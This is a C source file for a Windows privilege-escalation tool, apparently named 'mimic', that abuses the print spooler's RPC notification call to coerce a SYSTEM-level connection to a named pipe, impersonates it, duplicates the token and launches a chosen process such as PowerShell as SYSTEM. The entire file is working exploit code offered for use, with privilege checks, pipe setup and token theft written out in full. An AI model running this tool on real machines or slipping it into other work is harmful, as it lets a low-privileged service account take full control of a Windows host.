#include <windows.h>
#include <winbase.h>
#include <sddl.h>
#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>

#include "ms-rprn_h.h"

void printTokenAccountInfo(HANDLE token);
void printTokenImpersonationLevel(HANDLE token);
void executeShell(HANDLE token, LPCWSTR processName);
void printLastError(char* str);
LPWSTR charToLPWSTR(char* charString);
int checkPrivilege(HANDLE token, LPCTSTR lpszPrivilege);
void enablePrivilege(HANDLE token, LPCTSTR privilege);
void impersonateClient(HANDLE hPipe, LPCWSTR processName);
HANDLE triggerNamedPipeConnection(LPWSTR pipeName);
DWORD triggerNamedPipeConnectionThread(LPVOID pipeName);

int main(int argc, char* argv[]) {

    if (argc < 1) {
        printf("Usage: ./mimic <process>\nExample: ./mimic.exe \\\\.\\pipe\\test C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
        exit(1);
    }

    LPCWSTR processName = (LPCWSTR)charToLPWSTR(argv[1]);

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    HANDLE token = INVALID_HANDLE_VALUE;

    //Get our token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        printLastError("[x] OpenProcessToken Failed.");
    }

    int IsSeImpersonateEnabled = checkPrivilege(token, SE_IMPERSONATE_NAME);
    int IsSeAssignPrimaryTokenEnabled = checkPrivilege(token, SE_ASSIGNPRIMARYTOKEN_NAME);

    //Quit if both SeImpersonate and SeAssignPrimaryToken are not found.
    if (IsSeImpersonateEnabled < 0 && IsSeAssignPrimaryTokenEnabled < 0) {
        puts("[x] SeImpersonate and SeAssignPrimaryToken both not found! exiting.");
        exit(1);
    }

    //Enable privilege if found and disabled
    if (IsSeImpersonateEnabled > 0) {
        enablePrivilege(token, SE_IMPERSONATE_NAME);
        IsSeImpersonateEnabled = 0;
    }

    if (IsSeAssignPrimaryTokenEnabled > 0) {
        enablePrivilege(token, SE_ASSIGNPRIMARYTOKEN_NAME);
        IsSeAssignPrimaryTokenEnabled = 0;
    }

    //Generate UUID to use as pipe name.
    UUID uuid = { 0 };
    LPWSTR uuidStr;
    if (UuidCreate(&uuid) != RPC_S_OK) {
        printLastError("[x] UuidCreate Failed.");
    }

    if (UuidToString(&uuid, (RPC_CWSTR*)&uuidStr) != RPC_S_OK) {
        printLastError("[x] UuidToStr Failed.");
    }
    
    LPWSTR pipeName = malloc(MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(pipeName, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", uuidStr);

    if ((hPipe = CreateNamedPipeW((LPCWSTR)pipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, NULL)) != INVALID_HANDLE_VALUE) {
        printf("Named pipe: %ls created\n", pipeName);
        //Create non-signaled event for pipe
        HANDLE pipeEvent = INVALID_HANDLE_VALUE;
        OVERLAPPED ol = { 0 };

        pipeEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

        if (!pipeEvent) {
            free(pipeName);
            printLastError("[x] CreateEvent Failed!");
        }

        memset(&ol, 0, sizeof(ol));
        ol.hEvent = pipeEvent;

        //Start listening for connections aynchnorusly
        if (!ConnectNamedPipe(hPipe, &ol) && GetLastError() != ERROR_IO_PENDING) {
            free(pipeName);
            printLastError("ConnectNamedPipe Failed");
        }
        printf("[*] Named pipe %ls listening...\n", pipeName);

        //Trigger the thread that changes printer state to notify
        HANDLE printThread = triggerNamedPipeConnection(uuidStr);

        //Wait for a connection to pipe
        if (WaitForSingleObject(pipeEvent, 5000) != WAIT_OBJECT_0) {
            free(pipeName);
            printf("[x] WaitForSingleObject timed out.");
            exit(1);
        }

        //Impersonate the connected client
        impersonateClient(hPipe, processName);
    }
    else {
        free(pipeName);
        printLastError("[x] Failed to create pipe");
    }
    free(pipeName);
}

void printTokenAccountInfo(HANDLE token) {
    DWORD tokenInfoSize = 0;

    if (!GetTokenInformation(token, TokenUser, NULL, 0, &tokenInfoSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printLastError("[x] Failed to get token length!");
    }

    TOKEN_USER* tokenUser = NULL;
    tokenUser = malloc(tokenInfoSize);

    if (!GetTokenInformation(token, TokenUser, tokenUser, tokenInfoSize, &tokenInfoSize)) {
        free(tokenUser);
        printLastError("[x] Failed to get token information");
    }

    LPWSTR strSID = NULL;

    if (!ConvertSidToStringSidW(tokenUser->User.Sid, &strSID)) {
        free(tokenUser);
        printLastError("[x] Failed to convert SID to string!");
    }

    printf("[*] Client SID: %ls\n", strSID);
    LocalFree(strSID);

    CHAR nameSID[256];
    char domainName[256];
    DWORD nameSIDSize = sizeof(nameSID);
    DWORD domainNameSize = sizeof(domainName);
    SID_NAME_USE peUse;

    //Get account name from SID
    if (!LookupAccountSidA(NULL, tokenUser->User.Sid, nameSID, &nameSIDSize, domainName, &domainNameSize, &peUse)) {
        free(tokenUser);
        puts("[*] Failed to get username");
    }

    const char* accountType = NULL;
    switch (peUse) {
    case SidTypeUser: accountType = "User"; break;
    case SidTypeGroup: accountType = "Group"; break;
    case SidTypeDomain: accountType = "Domain"; break;
    case SidTypeAlias: accountType = "Alias"; break;
    case SidTypeWellKnownGroup: accountType = "Well-Known Group"; break;
    case SidTypeDeletedAccount: accountType = "Deleted Account"; break;
    case SidTypeInvalid: accountType = "Invalid"; break;
    case SidTypeUnknown: accountType = "Unknown"; break;
    case SidTypeComputer: accountType = "Computer"; break;
    default: accountType = "Other"; break;
    }

    printf("[*] Account Type: %s\n", accountType);

    free(tokenUser);
}

void printTokenImpersonationLevel(HANDLE token) {
    DWORD tokenLevelSize = 0;

    if (!GetTokenInformation(token, TokenImpersonationLevel, NULL, 0, &tokenLevelSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printLastError("[x] Failed to get TokenImpersonationLevel length");
    }

    SECURITY_IMPERSONATION_LEVEL* tokenLevel = NULL;
    tokenLevel = malloc(tokenLevelSize);

    if (!GetTokenInformation(token, TokenImpersonationLevel, tokenLevel, tokenLevelSize, &tokenLevelSize)) {
        free(tokenLevel);
        printLastError("Failed to get tokenImpersonationLevel");
    }

    char* impersonationLevel = NULL;
    switch (*tokenLevel) {
    case SecurityAnonymous: impersonationLevel = "SecurityAnonymous"; break;
    case SecurityIdentification: impersonationLevel = "SecurityIdentification"; break;
    case SecurityImpersonation: impersonationLevel = "SecurityImpersonation"; break;
    case SecurityDelegation: impersonationLevel = "SecurityDelegation"; break;
    default: impersonationLevel = "Other"; break;
    }

    printf("[*] Impersonation Level: %s\n", impersonationLevel);
    free(tokenLevel);
}

void executeShell(HANDLE token, LPCWSTR processName) {
    //We first need to duplicate the impersonation token to a primary token to execute processes
    HANDLE primaryToken = INVALID_HANDLE_VALUE;

    if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &primaryToken)) {
        printLastError("[x] Failed to Duplicate token");
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    //Execute in context of primary token
    if (CreateProcessAsUserW(primaryToken, processName, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(primaryToken);
        return;
    }
    else {
        printf("[x] Failed to create process As user, GLE=%d\n", GetLastError());
    }

    if (CreateProcessWithTokenW(primaryToken, LOGON_WITH_PROFILE, processName, NULL, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(primaryToken);
        return;
    }
    else {
        printf("[x] Failed to create process with token, GLE=%d\n", GetLastError());
    }

    CloseHandle(primaryToken);
    printLastError("Failed to execute process");
}

void printLastError(char* str) {
    DWORD err = GetLastError();
    char* msgBuf;
    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, err, 0, (LPSTR)&msgBuf, 0, NULL);
    printf("%s: %s, GLE=%d\n", str, msgBuf, GetLastError());
    LocalFree(msgBuf);
    exit(1);
}

LPWSTR charToLPWSTR(char* charString) {
    if (charString == NULL) {
        return NULL;
    }

    // Get the length of the resulting wide string
    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, charString, -1, NULL, 0);
    if (sizeNeeded <= 0) {
        return NULL;
    }

    // Allocate memory for the wide string
    LPWSTR wideString = (LPWSTR)malloc(sizeNeeded * sizeof(WCHAR));
    if (wideString == NULL) {
        return NULL;
    }

    // Perform the conversion
    if (MultiByteToWideChar(CP_UTF8, 0, charString, -1, wideString, sizeNeeded) <= 0) {
        free(wideString);
        return NULL;
    }

    return wideString;
}


int checkPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege) {
    TOKEN_PRIVILEGES tp;
    DWORD dwSize = 0;

    // Get the token privileges
    if (!GetTokenInformation(hToken, TokenPrivileges, &tp, sizeof(TOKEN_PRIVILEGES), &dwSize)) {
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            BYTE* buffer = (BYTE*)malloc(dwSize);
            if (buffer && GetTokenInformation(hToken, TokenPrivileges, buffer, dwSize, &dwSize)) {
                TOKEN_PRIVILEGES* pTokenPrivileges = (TOKEN_PRIVILEGES*)buffer;
                for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
                    LUID_AND_ATTRIBUTES la = pTokenPrivileges->Privileges[i];
                    TCHAR szName[256];
                    DWORD cchName = sizeof(szName) / sizeof(szName[0]);

                    if (LookupPrivilegeName(NULL, &la.Luid, szName, &cchName)) {
                        if (_tcscmp(szName, lpszPrivilege) == 0) {
                            if (la.Attributes & SE_PRIVILEGE_ENABLED) {
                                free(buffer);
                                return 0;   //If found and enabled, return 0
                            }
                            else {
                                free(buffer);
                                return 1;   //If found but disabled return 1
                            }
                        }
                    }
                }
                free(buffer);
                return -1;   //If not found return -1
            }
            else {
                printLastError("[x] Failed to get token information.\n");
            }
        }
        else {
            printLastError("[x] Failed to get token information size.\n");
        }
    }
}

void enablePrivilege(HANDLE token, LPCTSTR lpszPrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        printf("[x] Failed to enable privilage: %ls\n", lpszPrivilege);
        printLastError("[x] LookupPrivilegeValue Error");
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[x] Failed to enable privilage: %ls\n", lpszPrivilege);
        printLastError("[x] AdjustTokenPrivileges Error");
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[x] Could not enable privilege: %ls", lpszPrivilege);
        exit(1);
    }
}


void impersonateClient(HANDLE hPipe, LPCWSTR processName) {
    HANDLE token = INVALID_HANDLE_VALUE;

    //Impersonation Fails if We do not read data from the pipe beforehand.
    WCHAR buffer[1024] = { 0 };
    DWORD bytesRead = 0;
    BOOL isPipeRead = ReadFile(hPipe, buffer, sizeof(buffer), &bytesRead, NULL);
    if (!isPipeRead || !bytesRead) {
        printLastError("[x] Failed to read pipe!");
    }
    printf("%ls\n", buffer);
    //Reply to the client
    WriteFile(hPipe, buffer, bytesRead, NULL, NULL);


    if (ImpersonateNamedPipeClient(hPipe)) {
        //ImpersonateNamedPipeClient Changes our threads security context to the impersonation token of the client
        //By calling OpenThreadToken, we get the said impersonation token.
        if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &token)) {
            printTokenAccountInfo(token);
            printTokenImpersonationLevel(token);
            executeShell(token, processName);
            CloseHandle(token);
        }
        else {
            printLastError("[x] OpenThreadToken() Failed");
        }
        RevertToSelf();
    }
    else {
        printLastError("[x] Failed to impersonate client!");
    }
}

HANDLE triggerNamedPipeConnection(LPWSTR pipeName) {
    DWORD threadID = 0;
    HANDLE hThread = CreateThread(NULL, 0, triggerNamedPipeConnectionThread, pipeName, 0, &threadID);

    if (!hThread) {
        printLastError("[x] Could not initiate print thread.");
    }

    return hThread;
}

DWORD triggerNamedPipeConnectionThread(LPVOID pipeName) {
    PRINTER_HANDLE hPrinter = INVALID_HANDLE_VALUE;
    DEVMODE_CONTAINER devmodContainer = { 0 };

    DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH + 1;
    LPWSTR computerName = malloc(computerNameLength * sizeof(WCHAR) + 1);
    LPWSTR captureServer = malloc(MAX_PATH * sizeof(WCHAR));
    LPWSTR targetServer = malloc(MAX_PATH * sizeof(WCHAR));

    if (!GetComputerNameW(computerName, &computerNameLength)) {
        free(computerName);
        free(captureServer);
        free(targetServer);
        printLastError("[x] Couldn't Get computer name.");
    }

    StringCchPrintfW(captureServer, MAX_PATH, L"\\\\%ws/pipe/%ws", computerName, (LPCTSTR)pipeName);
    StringCchPrintfW(targetServer, MAX_PATH, L"\\\\%ws", computerName);

    if (RpcOpenPrinter(targetServer, &hPrinter, NULL, &devmodContainer, 0) == RPC_S_OK) {

        if (!RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, captureServer, 0, NULL)) {
            free(computerName);
            free(captureServer);
            free(targetServer);
            RpcClosePrinter(&hPrinter);
            printLastError("[x] RpcRemoteFindFirstPrinterChangeNotificationEx Failed.");
        }
        RpcClosePrinter(&hPrinter);
    }

    free(computerName);
    free(captureServer);
    free(targetServer);
}

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
    RPC_STATUS RpcStatus;
    RPC_WSTR StringBinding;
    handle_t BindingHandle;

    if (RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpStr, (RPC_WSTR)L"\\pipe\\spoolss", NULL, &StringBinding) != RPC_S_OK)
        return NULL;

    RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

    RpcStringFreeW(&StringBinding);

    if (RpcStatus != RPC_S_OK)
        return NULL;

    return BindingHandle;
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
    RpcBindingFree(&BindingHandle);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}

void __RPC_USER PRINTER_HANDLE_rundown(PRINTER_HANDLE phPrinter) {
    if (phPrinter) {
        free(phPrinter);
    }
}